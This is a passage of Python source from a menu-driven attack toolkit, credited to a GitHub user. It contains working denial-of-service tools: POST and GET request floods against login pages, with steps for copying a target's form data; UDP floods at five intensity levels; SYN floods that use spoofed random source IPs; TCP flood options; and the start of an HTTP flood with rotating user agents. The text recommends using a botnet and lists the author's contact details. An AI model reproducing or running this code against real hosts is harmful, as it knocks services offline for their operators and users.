                                        for i in range(int(threads_numbr)):
                                            list_of_thrds[i].join()

                                except KeyboardInterrupt:
                                    exit()                                    

                            if tool_acces == "cls":
                                try:
                                    os.system("cls")
                                except:
                                    os.system("clear")

                        except KeyboardInterrupt:
                                exit()
                if tool3 == "13":
                    # Banner
                    print(
                        Fore.GREEN + 
                        """
                                      __ _                 _ 
                    _ __ ___  __ _   / _| | ___   ___   __| |
                   | '__/ _ \/ _` | | |_| |/ _ \ / _ \ / _` |
                   | | |  __/ (_| | |  _| | (_) | (_) | (_| |   ~>Request flooding app<~
                   |_|  \___|\__, | |_| |_|\___/ \___/ \__,_|  ~~>Made by tfwcodes(github)<~~
                                |_|                          
                       """
                    )
                    while True:
                        try:
                            # req_post for post req, req_get for get request
                            print("\n" + Fore.BLUE + "[!] 'req_post' for multiple denied POST req [MOST EFICIENT/FASTEST] " + "\n" + Fore.BLUE + "[!] 'req_get' for multiple denied GET req [LIGHTER ONE]" + "\n")
                            what = input("[+] What service do you want to use: ")
                            # If the user uses the service 'req_post' it will start the req flood with the method post
                            if what == "req_post":
                                while True:
                                    try:
                                        # Help menu
                                        print(
                                          "\n" + Fore.BLUE + "[!] Enter recommended_threads to see how many threads are recommended for an ordinary pc" + "\n" + Fore.BLUE + "[!] Enter attack_info to see info about how to start the attack (you might wanna see this if you never tested the app)" + "\n" + Fore.BLUE + "[!] Enter start_attack to start the attack" + "\n" + Fore.BLUE + "[!] Enter cls to clear the screen" + "\n" + Fore.BLUE + "[!] Enter dev to see how to reach me" + "\n" + Fore.BLUE + "[!] Enter response_info to see info about what response you get" + "\n" + Fore.BLUE + "[!] If you want to exit press Ctrl+C(if you press while the attack is running it will not work)" + "\n")
                                        # It will make a while loop that prints the help menu and asks you to enter a command
                                        command = input(Fore.GREEN + "[+] Enter a command: ")
                                        # The initial dos/DDoS attack
                                        if command == "start_attack":
                                            try:
                                                # Enter target url
                                                url = input(Fore.GREEN + "[+] Enter the target url: ")
                                                # Enter the number of threads that will be used in the attack
                                                number_of_threads = input(Fore.GREEN + "[+] Enter the number of threads: ")
                                                print(Fore.GREEN + "[!]-----> 0%")
                                                time.sleep(2)
                                                print(Fore.GREEN + "[!]-----> 25%")
                                                time.sleep(2)
                                                print(Fore.GREEN + "[!]-----> 50%")
                                                time.sleep(2)
                                                print(Fore.GREEN + "[!]-----> 100%")
                                                time.sleep(1)
                                                print(Fore.GREEN + "[!] The attack is going")
                                                # Form data
                                                data = {
                                                    'rcr_authenticate': '1',
                                                    'rcr_user': 'E-mail',
                                                    'rcr_pass': 'Password',
                                                    'rcr_submit': 'Conectare'
                                                }

                                                # The list of threads were all the threads are gonna be append
                                                list_of_threads = []


                                                # Make the while loop request with the method post
                                                def flood():
                                                    while True:
                                                        response = requests.post(url, data=data)
                                                        print(response)


                                                # The multi-threading part
                                                # It will have number_of_threads(this is the variable that asks you for the number of threads) threads for this attack
                                                for i in range(int(number_of_threads)):
                                                    # The multi-threading will have the target flood(where is the while loop request)
                                                    t = threading.Thread(target=flood)
                                                    t.daemon = True
                                                    # t will be append in the list of threads (named list_of_threads)
                                                    list_of_threads.append(t)

                                                for i in range(int(number_of_threads)):
                                                    # Start the threads
                                                    list_of_threads[i].start()

                                                for i in range(int(number_of_threads)):
                                                    # Join the threads
                                                    list_of_threads[i].join()
                                            except KeyboardInterrupt:
                                                exit()

                                        if command == "attack_info":
                                            try:
                                                # Print i   nfo about how to start the attack
                                                print(
                                                    "\n" + Fore.BLUE + "to start the attack you need too:" + "\n" + Fore.BLUE + "1. first go to the target and go to inspect" + "\n" + Fore.BLUE + "2. you put random data on the login page, then press f12 go to the network tab, then you make the request and go to the file that has the post method and scroll down untill you see the form data (if the target has an id, token, rechaptcha token or anything else the attack will not work)" + "\n" + Fore.BLUE + "3. you paste what it is in the form data, then go into the program and paste the form data in to the variable named data like this: data = {'rcr_authenticate': '1', 'rcr_user': 'dfssf', 'rcr_pass': 'sdfsfs', 'rcr_submit': 'Conectare'} (this is an example)" + "\n" + Fore.BLUE + "4. You run the app, you put the url you saw on the network which will be the target url, you put how many threads you want for the attack and start it:)")
                                            except:
                                                pass
                                        if command == "recommended_threads":
                                            try:
                                                # Print the recommended threads
                                                print(
                                                   "\n" +  Fore.BLUE + "The recommended threads for an ordinary pc are between 50-300 and if you have a powerful pc then the recommended threads are between 300-700")
                                            # If there will be any error it will print an error occurred
                                            except:
                                                print(Fore.BLUE + "[!!!] An error occurred")
                                        # How to reach me (my discord and gmail)
                                        if command == "dev":
                                            try:
                                                print("\n" + Fore.BLUE + "Discord: tfw#2946, Gmail: mungureanuu@gmail.com")
                                            except:
                                                print(Fore.BLUE + "[!!!] An error occurred")
                                        # Print info about the response
                                        if command == "response_info":
                                            try:
                                                print(
                                                  "\n" + Fore.BLUE + "If you start the attack and you get response 200 that means that the attack is succesfull and is working, if you get something else you can see more info about here: https://developer.mozilla.org/en-US/docs/Web/HTTP/Status")
                                            except:
                                                print(Fore.BLUE + "[!!!]An error occurred")
                                        if command == "cls":
                                            try:
                                                # If the user is on windows it will execute the command cls, else If the user uses any other operating system it will execute the command clear
                                                os.system('cls')
                                            except:
                                                os.system("clear")
                                    except KeyboardInterrupt:
                                        exit()
                            # Else if the user uses the service 'req_get' it will start the req flood with the method get
                            if what == "req_get":
                                while True:
                                        try:
                                            print("\n" + Fore.BLUE + "[!] Enter start_dos to start the attack" +"\n" + Fore.BLUE + "[!] Enter dev_me to see how to reach me" + "\n" + Fore.BLUE + "[!] Enter resp_info to see info about the response of your attack" + "\n" + Fore.BLUE + "[!] Enter cls to clear the screen" + "\n") 
                                            command_2 = input("[+] Enter a command: ")
                                            if command_2 == "start_dos":
                                                try:
                                                    # Url target
                                                    url_target_2 = input(Fore.GREEN + "[+] Enter the url target: ")
                                                    # Number of threads
                                                    number_of_threads_2 = input(Fore.GREEN + "[+] Enter the number of threads for the attack: ")
                                                    print(Fore.GREEN + "[!]-----> 0%")
                                                    time.sleep(2)
                                                    print(Fore.GREEN + "[!]-----> 25%")
                                                    time.sleep(2)
                                                    print(Fore.GREEN + "[!]-----> 50%")
                                                    time.sleep(2)
                                                    print(Fore.GREEN + "[!]-----> 100%")
                                                    time.sleep(1)
                                                    print(Fore.GREEN + "[!] The attack is going")
                                                    # Request sessiom
                                                    ses = requests.session()
                                                    # Do a while loop with a get request and then print the response
                                                    def do_req():
                                                        while True:
                                                            r = ses.get(url_target_2)
                                                            print(r)
                                                    # The list of threads
                                                    threads_2 = []

                                                    # Start the multithreading
                                                    for i in range(int(number_of_threads_2)):
                                                        t = threading.Thread(target=do_req)
                                                        t.daemon  = True
                                                        threads_2.append(t)

                                                    for i in range(int(number_of_threads_2)):
                                                        # Start the threads
                                                        threads_2[i].start()
                                                    for i in range(int(number_of_threads_2)):
                                                        # Join the threads
                                                        threads_2[i].join()
                                                except KeyboardInterrupt:
                                                    exit()
                                            if command_2 == "dev_me":
                                                try:
                                                    # My social platforms
                                                    print("\n" + Fore.BLUE + "Discord: tfw#2946, Gmail: mungureanuu@gmail.com")
                                                except:
                                                    print(Fore.BLUE + "[!!!]An error occurred")
                                            if command_2 == "resp_info":
                                                try:
                                                    # info about the response 
                                                    print("\n" + Fore.BLUE + "If you start the attack and you get response 200 that means that the attack is succesfull and is working, if you get something else you can see more info about here: https://developer.mozilla.org/en-US/docs/Web/HTTP/Status")
                                                except:
                                                    print(Fore.BLUE + "[!!!] An error occurred")
                                            if command_2 == "cls":
                                                try:
                                                    # If the user is on windows it will execute the command cls, else If the user uses any other operating system it will execute the command clear
                                                    os.system('cls')
                                                except:
                                                    os.system('clear')

                                        except KeyboardInterrupt:
                                            exit()
                                        
                        # If the user is gonna press Ctrl+C it wil exit the program
                        except KeyboardInterrupt:
                            exit()

                if tool3 == "15":
                    print(
                        Fore.GREEN + 
                        """
                        _   _     _         _____ _                 _ 
                       | | | | __| |_ __   |  ___| | ___   ___   __| |
                       | | | |/ _` | '_ \  | |_  | |/ _ \ / _ \ / _` |  ~>Udp Flood<~
                       | |_| | (_| | |_) | |  _| | | (_) | (_) | (_| | ~~>Made by tfwcodes(github)<~~
                        \___/ \__,_| .__/  |_|   |_|\___/ \___/ \__,_|
                                   |_|

                        """
                    )
                    while True:
                        try:
                            print("\n" + Fore.BLUE + "[!] Enter udp_flood to start the udp flood" + "\n" + Fore.BLUE + "[!] Enter udp_info to see info about the attack (you might wanna see this if you never tested the app)" + "\n" + Fore.BLUE + "[!] Enter cls to clear the screen" + "\n")
                            cmnd  = input("[+] Enter a command: ")
                            if cmnd == "udp_flood":
                                try:
                                    ip2 = input(Fore.GREEN + "[+] Enter the target ip address: ")
                                    port2 = input(Fore.GREEN + "[+] Enter the port you want to attack: ")
                                    data = input(Fore.GREEN + "[+] Enter the data you want to send: ")
                                    threads_6 = input(Fore.GREEN + "[+] Enter the number of threads: ")
                                    powerful = input(Fore.GREEN + "[+] Enter how powerful do you want the attack to be (1[THE LIGHTER ONE] - 5 [THE MOST POWERFUL ONE] : ")

                                    if powerful == "1":
                                        try:
                                            print(Fore.GREEN + "[!]-----> 0%")
                                            time.sleep(2)
                                            print(Fore.GREEN + "[!]-----> 25%")
                                            time.sleep(2)
                                            print(Fore.GREEN + "[!]-----> 50%")
                                            time.sleep(2)
                                            print(Fore.GREEN + "[!]-----> 100%")
                                            time.sleep(1)
                                            print(Fore.GREEN + "[!] The attack is going")
                                            def UDP():
                                                while True:
                                                    try:
                                                        # SOCK_DGRAM is for udp
                                                        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                                                        # Str the ip and int the port
                                                        addr = (str(ip2), int(port2))
                                                        # send to the varaiable addr the data and encoded with utf-8
                                                        sock.sendto(data.encode("utf-8"), addr)
                                                    except:
                                                        print(Fore.BLUE + "[!!!] An error occurred")
                                            # The list of threads
                                            threads_7 = []

                                            #start the multi threading with the threads (threads_6)
                                            for i in range(int(threads_6)):
                                                # the target is the udp flood attack
                                                t = threading.Thread(target=UDP)
                                                # t.daemon is True
                                                t.daemon = True
                                                # append t to the list of threads
                                                threads_7.append(t)

                                            for i in range(int(threads_6)):
                                                # Start the threads
                                                threads_7[i].start()

                                            for i in range(int(threads_6)):
                                                # join the threads
                                                threads_7[i].join()
                                        except KeyboardInterrupt:
                                            exit()

                                    if powerful == "2":
                                        try:
                                            print(Fore.GREEN + "[!]-----> 0%")
                                            time.sleep(2)
                                            print(Fore.GREEN + "[!]-----> 25%")
                                            time.sleep(2)
                                            print(Fore.GREEN + "[!]-----> 50%")
                                            time.sleep(2)
                                            print(Fore.GREEN + "[!]-----> 100%")
                                            time.sleep(1)
                                            print(Fore.GREEN + "[!] The attack is going")
                                            def UDP():
                                                while True:
                                                    try:
                                                        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                                                        sock2 = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                                                        #string the ip addres and int port
                                                        addrs = (str(ip2), int(port2))
                                                        # Send the data
                                                        sock.sendto(data.encode("utf-8"), addrs)
                                                        sock2.sendto(data.encode("utf-8"), addrs)
                                                    except:
                                                        print(Fore.BLUE + "[!!!] An error occurred")

                                            threads_8 = []
                                            for i in range(int(threads_6)):
                                                t = threading.Thread(target=UDP)
                                                t.daemon  = True
                                                threads_8.append(t)

                                            for i in range(int(threads_6)):
                                                threads_8[i].start()

                                            for i in range(int(threads_6)):
                                                threads_8[i].join()
                                        except KeyboardInterrupt:
                                            exit()
                                    
                                    if powerful == "3":
                                        try:
                                            print(Fore.GREEN + "[!]-----> 0%")
                                            time.sleep(2)
                                            print(Fore.GREEN + "[!]-----> 25%")
                                            time.sleep(2)
                                            print(Fore.GREEN + "[!]-----> 50%")
                                            time.sleep(2)
                                            print(Fore.GREEN + "[!]-----> 100%")
                                            time.sleep(1)
                                            print(Fore.GREEN + "[!] The attack is going")
                                            def UDP():
                                                while True:
                                                    try:
                                                        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                                                        sock2 = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                                                        sock3 = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                                                        addrs = (str(ip2), int(port2))
                                                        sock.sendto(data.encode("utf-8"), addrs)
                                                        sock2.sendto(data.encode("utf-8"), addrs)
                                                        sock3.sendto(data.encode("utf-8"), addrs)
                                                    except:
                                                        print(Fore.BLUE + "[!!!] An error occurred")

                                            threads_9 = []

                                            for i in range(int(threads_6)):
                                                t = threading.Thread(target=UDP)
                                                t.daemon = True
                                                threads_9.append(t)
                                            
                                            for i in range(int(threads_6)):
                                                threads_9[i].start()
                                            
                                            for i in range(int(threads_6)):
                                                threads_9[i].join()
                                        except KeyboardInterrupt:
                                            exit()

                                    if powerful == "4":
                                        try:
                                            print(Fore.GREEN + "[!]-----> 0%")
                                            time.sleep(2)
                                            print(Fore.GREEN + "[!]-----> 25%")
                                            time.sleep(2)
                                            print(Fore.GREEN + "[!]-----> 50%")
                                            time.sleep(2)
                                            print(Fore.GREEN + "[!]-----> 100%")
                                            time.sleep(1)
                                            print(Fore.GREEN + "[!] The attack is going")
                                            def UDP():
                                                while True:
                                                    try:
                                                        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                                                        sock2 = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                                                        sock3 = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                                                        sock4 = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                                                        addrs = (str(ip2), int(port2))
                                                        sock.sendto(data.encode("utf-8"), addrs)
                                                        sock2.sendto(data.encode("utf-8"), addrs)
                                                        sock3.sendto(data.encode("utf-8"), addrs)
                                                        sock4.sendto(data.encode("utf-8"), addrs)
                                                    except:
                                                        print(Fore.BLUE + "[!!!] An error occurred")
                                            threads_9 = []
                                            for i in range(int(threads_6)):
                                                t = threading.Thread(target=UDP)
                                                t.daemon = True
                                                threads_9.append(t)

                                            for i in range(int(threads_6)):
                                                threads_9[i].start()

                                            for i in range(int(threads_6)):
                                                threads_9[i].join()
                                        except KeyboardInterrupt:
                                            exit()
                                    
                                    if powerful == "5":
                                        try:
                                            print(Fore.GREEN + "[!]-----> 0%")
                                            time.sleep(2)
                                            print(Fore.GREEN + "[!]-----> 25%")
                                            time.sleep(2)
                                            print(Fore.GREEN + "[!]-----> 50%")
                                            time.sleep(2)
                                            print(Fore.GREEN + "[!]-----> 100%")
                                            time.sleep(1)
                                            print(Fore.GREEN + "[!] The attack is going")
                                            def UDP():
                                                while True:
                                                    try:
                                                        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                                                        sock2 = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                                                        sock3 = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                                                        sock4 = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                                                        sock5 = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                                                        addrs = (str(ip2), int(port2))
                                                        sock.sendto(data.encode("utf-8"), addrs)
                                                        sock2.sendto(data.encode("utf-8"), addrs)
                                                        sock3.sendto(data.encode("utf-8"), addrs)
                                                        sock4.sendto(data.encode("utf-8"), addrs)
                                                        sock5.sendto(data.encode("utf-8"), addrs)
                                                    except:
                                                        print(Fore.BLUE + "[!!!] An error occurred")
                                            threads_9 = []
                                            for i in range(int(threads_6)):
                                                t = threading.Thread(target=UDP)
                                                t.daemon = True
                                                threads_9.append(t)

                                            for i in range(int(threads_6)):
                                                threads_9[i].start()

                                            for i in range(int(threads_6)):
                                                threads_9[i].join()
                                        except KeyboardInterrupt:
                                            exit()

                                except KeyboardInterrupt:
                                    exit()

                            if cmnd == "udp_info":
                                try:
                                    # Info about the udp flood
                                    print("\n" + Fore.BLUE + "[!!!] WARNING - Do not use unless you have a very powerful pc or botnet! " + "\n" + Fore.BLUE + "[!!!] WARNING - If the target doesn't have the port you want to attack open, then you will flood yourself"+ "\n")
                                except KeyboardInterrupt:
                                    exit()

                            if cmnd == "cls":
                                try:
                                    os.system("cls")
                                except:
                                    os.system("clear")

                        except KeyboardInterrupt:
                            exit()         

                if tool3 == "16":
                    print(
                        Fore.GREEN + 
                        """

                         _____            _____ _                 _ 
                        |_   _|__ _ __   |  ___| | ___   ___   __| |
                          | |/ __| '_ \  | |_  | |/ _ \ / _ \ / _` | ~>Tcp Flood Tool<~
                          | | (__| |_) | |  _| | | (_) | (_) | (_| |~~>Made by tfwcodes(github)<~~
                          |_|\___| .__/  |_|   |_|\___/ \___/ \__,_|
                                 |_|

                        """
                    )
                    while True:
                        try:
                            print("\n" + Fore.BLUE + "[!] Enter tcp_flood to start the tcp flood" + "\n" + Fore.BLUE + "[!] Enter tcp_info to see info about the attack (you might wanna see this if you never tested the app)"  + "\n" + Fore.BLUE + "[!] Enter cls to clear the screen")
                            cmnd2 = input(Fore.GREEN + "[+] Enter a command: ")
                            if cmnd2 == "tcp_flood":
                                try:
                                    ip3 = str(input(Fore.GREEN + "[+] Enter the target ip address: "))
                                    port3 = int(input(Fore.GREEN + "[+] Enter the port you want to attack: "))
                                    data3 = input(Fore.GREEN + "[+] Enter the data you want to send: ")
                                    numbr_threads = input(Fore.GREEN + "[+] Enter the number of threads: ")
                                    powerful1 = input(Fore.GREEN + "[+] Enter how powerful do you want the attack to be (1[LIGHTER ONE] / 5 [STRONGEST/FASTEST] ): ")
                                    if powerful1 == "1":
                                        try:
                                            print(Fore.GREEN + "[!]-----> 0%")
                                            time.sleep(2)
                                            print(Fore.GREEN + "[!]-----> 25%")
                                            time.sleep(2)
                                            print(Fore.GREEN + "[!]-----> 50%")
                                            time.sleep(2)
                                            print(Fore.GREEN + "[!]-----> 100%")
                                            time.sleep(1)
                                            print(Fore.GREEN + "[!] The attack is going")
                                            tcp_flood()
                                        except KeyboardInterrupt:
                                            exit()
                                    if powerful1 == "2":
                                        try:
                                            print(Fore.GREEN + "[!]-----> 0%")
                                            time.sleep(2)
                                            print(Fore.GREEN + "[!]-----> 25%")
                                            time.sleep(2)
                                            print(Fore.GREEN + "[!]-----> 50%")
                                            time.sleep(2)
                                            print(Fore.GREEN + "[!]-----> 100%")
                                            time.sleep(1)
                                            print(Fore.GREEN + "[!] The attack is going")
                                            tcp_flood_1()
                                        except KeyboardInterrupt:
                                            exit()
                                    if powerful1 == "3":
                                        try:
                                            print(Fore.GREEN + "[!]-----> 0%")
                                            time.sleep(2)
                                            print(Fore.GREEN + "[!]-----> 25%")
                                            time.sleep(2)
                                            print(Fore.GREEN + "[!]-----> 50%")
                                            time.sleep(2)
                                            print(Fore.GREEN + "[!]-----> 100%")
                                            time.sleep(1)
                                            print(Fore.GREEN + "[!] The attack is going")
                                            tcp_flood_3()
                                        except KeyboardInterrupt:
                                            exit()
                                    if powerful1 == "4":
                                        try:
                                            print(Fore.GREEN + "[!]-----> 0%")
                                            time.sleep(2)
                                            print(Fore.GREEN + "[!]-----> 25%")
                                            time.sleep(2)
                                            print(Fore.GREEN + "[!]-----> 50%")
                                            time.sleep(2)
                                            print(Fore.GREEN + "[!]-----> 100%")
                                            time.sleep(1)
                                            print(Fore.GREEN + "[!] The attack is going")
                                            tcp_flood_4()
                                        except KeyboardInterrupt:
                                            exit()
                                    if powerful1 == "5":
                                        try:
                                            print(Fore.GREEN + "[!]-----> 0%")
                                            time.sleep(2)
                                            print(Fore.GREEN + "[!]-----> 25%")
                                            time.sleep(2)
                                            print(Fore.GREEN + "[!]-----> 50%")
                                            time.sleep(2)
                                            print(Fore.GREEN + "[!]-----> 100%")
                                            time.sleep(1)
                                            print(Fore.GREEN + "[!] The attack is going")
                                            tcp_flood_5()
                                        except KeyboardInterrupt:
                                            exit()
                                except KeyboardInterrupt:
                                    exit()    

                        except KeyboardInterrupt:
                            exit()

                if tool3 == "cls":
                    try:
                        os.system('cls')
                    except:
                        os.system("clear")
                
                if tool3 == "14":
                    try:
                            # The banner
                            print(
                                Fore.GREEN + 
                             """
                              ______   ___   _   _____ _                 _      _   _   _             _    
                             / ___\ \ / / \ | | |  ___| | ___   ___   __| |    / \ | |_| |_ __ _  ___| |__
                             \___ \  V /|  \| | | |_  | |/ _ \ / _ \ / _` |   / _ \| __| __/ _` |/ __| | / 
                              ___) || | | |\  | |  _| | | (_) | (_) | (_| |  / ___ \ |_| || (_| | (__|   <   ~>Syn Flood Attack<~
                             |____/ |_| |_| \_| |_|   |_|\___/ \___/ \__,_| /_/   \_\__|\__\__,_|\___|_|\_  ~~>Made by tfwcodes(github)<~~
                             """
                            )
                            while True:
                                try:
                                    print("\n" + Fore.BLUE + "[!] Entet start_syn to start the syn flood attack" + "\n" + Fore.BLUE + "[!] Enter syn_info (you might wanna see this if you never tested the app)" + "\n" + Fore.BLUE + "[!] Enter cls to clear the screen" + "\n")
                                    command_3 = input("[+] Enter a command: ")
                                    if command_3 == "start_syn":
                                        try:
                                            how = input(Fore.GREEN + "[+] How much powerfull do you want the attack to be ( 1[THE LIGHTER ONE] - 2[THE MOST POWERFUL/FASTEST] ) : ")
                                            # If the user uses the option 1 it will do the lighter attack
                                            if how == "1":
                                                try:
                                                    # It will have 3 params (ip_addres which is the target IP addres + sport which stands for the source port + dport which is the destination port)
                                                    def tcp_flood(ip_adddres, sport, dport):
                                                    	# the soruce addres will be a random ip
                                                    	s_addr = RandIP()
                                                    	# The destination addres
                                                    	d_addr = ip_adddres

                                                    	# The packet that will be send it will have the source addres the variable s_addr, dst it s the destination addres, the source port, the destination port, the sequence will be 200000, and for the attack to be a SYN attack we need to specify that the flag = S
                                                    	packet = IP(src=s_addr, dst=d_addr)/TCP(sport=sport, dport=dport, seq=200000, flags="S")
                                                    	# Send the packet
                                                    	send(packet)

                                                    # Asks for the ip
                                                    ip = str(input(Fore.GREEN + "[+] Enter the target ip addres: "))
                                                    # The port
                                                    port = int(input(Fore.GREEN + "[+] Enter the port you want to attack: "))

                                                    def syn2_flood():
                                                        # Because we want to send an infinite  packet we need to have a while loop
                                                        while True:
                                                        	try:
                                                        		tcp_flood(ip, 1234, port)	
                                                        	# if an error occurres it will print that
                                                        	except:
                                                        		print(Fore.BLUE + "[!!!] An error occurred")

                                                    nubmer_of_threads_3 = input(Fore.GREEN + "[+] Enter the number of threads: ")

                                                    threads_5 = []

                                                    for i in range(int(nubmer_of_threads_3)):
                                                        t = threading.Thread(target=syn2_flood)
                                                        t.daemon = True
                                                        threads_5.append(t)
                                                    
                                                    for i in range(int(nubmer_of_threads_3)):
                                                        threads_5[i].start()
                                                    
                                                    for i in range(int(nubmer_of_threads_3)):
                                                        threads_5[i].join()
                                                except KeyboardInterrupt:
                                                    exit()
                                                    
                                            # If the user uses option 2 then it will do the more powerful version of the attack
                                            if how == "2":
                                                try:
                                                    # It will have 3 params (ip_addres which is the target IP addres + sport which stands for the source port + dport which is the destination po
                                                    def tcp_flood(ip_adddres, sport, dport):
                                                    	# the soruce addres will be a random ip
                                                    	s_addr = RandIP()
                                                    	# The destination addres
                                                    	d_addr = ip_adddres
                                                    	# The packet that will be send it will have the source addres the variable s_addr, dst it s the destination addres, the source port, the 
                                                    	packet = IP(src=s_addr, dst=d_addr)/TCP(sport=sport, dport=dport, seq=200000, flags="S")
                                                    	# Send the packet
                                                    	send(packet)
                                                    def tcp_flood_2(ip_adddres_2, sport_2, dport_2):
                                                    	# the soruce addres will be a random ip
                                                    	s_addr = RandIP()
                                                    	# The destination addres
                                                    	d_addr = ip_adddres_2
                                                    	# The packet that will be send it will have the source addres the variable s_addr, dst it s the destination addres, the source port, the 
                                                    	packet = IP(src=s_addr, dst=d_addr)/TCP(sport=sport_2, dport=dport_2, seq=200000, flags="S")
                                                    	# Send the packet
                                                    	send(packet)
                                                    # Asks for the ip
                                                    ip = str(input(Fore.GREEN + "[+] Enter the target ip addres: "))
                                                    # The port
                                                    port = int(input(Fore.GREEN + "[+] Enter the port you want to attack: "))
                                                    # Because we want to send an infinite  packet we need to have a while loop
                                                    def syn_flood():
                                                        while True:
                                                        	try:
                                                        		tcp_flood_2(ip, 1234, port)
                                                        		tcp_flood(ip, 1234, port)	
                                                        	# if an error occurres it will print that
                                                        	except:
                                                        		print(Fore.BLUE + "[!!!] An error occurred")
                                                    threads_4 = []
                                                    
                                                    number_of_threads_4 = input(Fore.GREEN + "[+] Enter the number of threads: ")

                                                    for i in range(int(number_of_threads_4)):
                                                        t = threading.Thread(target=syn_flood)
                                                        t.daemon = True
                                                        threads_4.append(t)
                                                    for i in range(50):
                                                        threads_4[i].start()

                                                    for i in range(int(number_of_threads_4)):
                                                        threads_4[i].join()    
                                                            
                                                except KeyboardInterrupt:
                                                    exit()
                                        except KeyboardInterrupt:
                                            exit()    
                                    #If the user uses the command req_info then it will print all the warnings                                                                                                                                           
                                    if command_3 == "syn_info":
                                        try:
                                            print("\n" + Fore.BLUE + "[!!!] WARNING - Do not use unless you have a very powerful pc or botnet! " + "\n" + Fore.BLUE + "[!!!] WARNING - If the target doesn't have the port you want to attack open, then you will dos yourself"+ "\n")
                                        except KeyboardInterrupt:
                                            exit()
                                    
                                    if command_3 == "cls":
                                        try:
                                            os.system("cls")
                                        except:
                                            os.system("clear")
                                
                                except KeyboardInterrupt:
                                    exit()
                    except KeyboardInterrupt:
                        exit()

                if tool3 == "18":
                    while True:
                        try:
                            print("\n" + Fore.BLUE + "[!] Enter http_flood to start the http flood attack" + "\n" + Fore.BLUE + "[!] Enter attack_info to see info about the attack" + "\n" + Fore.BLUE + "[!] Enter response_info too see info about the response" + "\n" + Fore.BLUE + "[!] Enter cls to clear the screen" + "\n")
                            command_4 = input(Fore.GREEN + "[+] Enter a command: ")
                            if command_4 == "http_flood":
                                try:
                                    print(
                                        Fore.GREEN + 
                                        """
                                         _   _ _____ _____ ____    _____ _                 _ 
                                        | | | |_   _|_   _|  _ \  |  ___| | ___   ___   __| |
                                        | |_| | | |   | | | |_) | | |_  | |/ _ \ / _ \ / _` |
                                        |  _  | | |   | | |  __/  |  _| | | (_) | (_) | (_| |
                                        |_| |_| |_|   |_| |_|     |_|   |_|\___/ \___/ \__,_|

                                            _   _   _             _             ~>HTTP Flood Attack<~
                                           / \ | |_| |_ __ _  ___| | __        ~~>Made by tfwcodes(github)<~~
                                          / _ \| __| __/ _` |/ __| |/ /
                                         / ___ \ |_| || (_| | (__|   <
                                        /_/   \_\__|\__\__,_|\___|_|\_|

                                        """
                                    )                                                                                    
                                    url=input(Fore.GREEN + "[+] Enter the target url: ")
                                    threads_number_1 = input(Fore.GREEN + "[+] Enter the number of threads: ")                                                                                              

                                    headers_useragents=[]                                                                                                                                                                                                                                                                                                                                                                                                         
                                    threads_list_1_2 = []


                                    # useragent list
                                    def useragent_list():
                                    	global headers_useragents
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 2.0.50727; InfoPath.2)')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.1; Windows XP)')
                                    	headers_useragents.append('Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51')
                                    	headers_useragents.append('AppEngine-Google; (+http://code.google.com/appengine; appid: webetrex)')
                                    	headers_useragents.append('Mozilla/5.0 (compatible; MSIE 9.0; AOL 9.7; AOLBuild 4343.19; Windows NT 6.1; WOW64; Trident/5.0; FunWebProducts)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; AOL 9.7; AOLBuild 4343.27; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; AOL 9.7; AOLBuild 4343.21; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30; .NET CLR 3.0.04506.648; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET4.0C; .NET4.0E)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; AOL 9.7; AOLBuild 4343.19; Windows NT 5.1; Trident/4.0; GTB7.2; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; AOL 9.7; AOLBuild 4343.19; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30; .NET CLR 3.0.04506.648; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET4.0C; .NET4.0E)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 7.0; AOL 9.7; AOLBuild 4343.19; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30; .NET CLR 3.0.04506.648; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET4.0C; .NET4.0E)')
